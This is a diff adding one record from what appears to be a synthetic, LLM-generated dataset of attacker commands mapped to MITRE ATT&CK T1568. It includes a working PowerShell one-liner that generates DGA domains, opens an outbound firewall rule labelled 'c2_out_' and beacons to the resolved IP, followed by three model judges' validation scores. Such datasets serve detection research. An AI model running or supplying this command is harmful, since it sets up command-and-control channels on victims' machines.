@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$seed='pool';$date=(Get-Date -Format 'yyyyMMdd');$dlist=1..10|%{(''+$seed+$_+'.'+$date+'.com')};$d=$dlist|Get-Random;try{$a=Resolve-DnsName $d -Type A -ErrorAction Stop;$ips=$a|Select-Object -ExpandProperty IPAddress;$ip=$ips[(Get-Random -Min 0 -Max $ips.Count)];$port=(Get-Random -Min 20000 -Max 20300);netsh advfirewall firewall add rule name='c2_out_'+$port dir=out action=allow protocol=TCP remoteip=$ip remoteport=$port;Invoke-WebRequest -Uri ('http://'+$ip+':'+$port+'/k') -Headers @{Host=$d;Rand='1'} -UseBasicParsing -TimeoutSec 5}catch{}",
+  "explanation": "Builds a DGA pool, selects a current candidate and one of its A records, then communicates directly to the IP on a high, randomized port while spoofing the Host header for dynamic domain alignment.",
+  "rationale_steps": [
+    "Rotate among multiple candidate domains and their flux IPs.",
+    "Use a non-standard port and Host header to maintain domain-based routing semantics."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-45dc1ae3",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid flag formats, and appropriate error handling with try/catch.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by algorithmically generating domain names based on a seed and date, randomly selecting one, resolving it to an IP, choosing a random port, creating a firewall rule, and establishing communication with proper error handling.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:51:42.757516Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell one-liner is well-formed with balanced quoting/braces, valid cmdlets/parameters, and proper separators.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements DGA-style domain generation, resolution, and IP-based contact consistent with T1568, but Host header overriding may be blocked, single-record indexing can break, and the firewall rule likely requires admin.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T05:52:38.666771Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, braces, and proper PowerShell cmdlet and `netsh` command syntax, making it fully parseable and runnable.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements DGA generation, dynamic DNS resolution with IP selection, and direct IP communication with Host header spoofing, all aligning perfectly with T1568, but the `netsh` firewall rule modification step will fail due to the stated 'Privilege: None' constraint, creating a realism gap in operational feasibility for ensuring communication.",
+        "combined_score": 4.5,
+        "confidence": null,
+        "timestamp": "2025-10-02T06:00:47.684994Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
